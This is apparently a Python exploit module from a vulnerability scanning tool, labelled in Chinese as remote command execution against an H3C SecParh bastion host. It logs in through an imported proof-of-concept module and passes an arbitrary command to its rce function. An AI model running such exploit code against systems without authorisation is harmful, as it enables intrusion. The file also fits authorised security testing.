# -*- coding:utf-8 -*-
# H3C SecParh堡垒机远程命令执行
import requests

from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from . import h3c_secparth_rce_poc
from ..requestClass import Requests
from .h3c_secparth_rce_poc import POC


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)

    def exp(self, cmd, content=""):
        session = requests.session()
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        poc.login(self.vuln.url, session)
        return poc.rce(self.vuln.url, session, cmd)
